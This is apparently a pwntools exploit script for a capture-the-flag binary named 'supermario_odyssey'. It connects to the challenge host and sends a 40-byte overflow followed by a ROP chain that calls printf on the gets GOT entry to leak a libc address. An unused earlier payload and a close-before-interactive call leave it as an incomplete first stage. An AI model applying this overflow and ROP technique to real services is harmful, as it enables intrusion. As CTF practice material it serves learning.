#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from ctypes import CDLL

context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = 'error' # se non vuoi vedere i loggin
exe = context.binary = ELF(args.EXE or './supermario_odyssey')
lib = CDLL(exe.libc.path)
host = args.HOST or 'supermario-odyssey.chall.srdnlen.it'
port = int(args.PORT or 443)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port, ssl=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *0x4011cc
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

rdi = p64(0x4011e7)
printf = p64(0x401094)
get = p64(0x4010a4)
dati = p64(0x404000)
adjust = p64(0x4011ef)

payload = flat(
    b"A" * 40, # padding
    rdi, dati, adjust, get, 
    rdi, dati, adjust, printf 
)

payload = flat(
    b"A" * 40, # padding
    rdi, get, adjust, printf 
)

io.sendlineafter(b"> ", payload)
print(io.recvline())

io.close()
io.interactive()

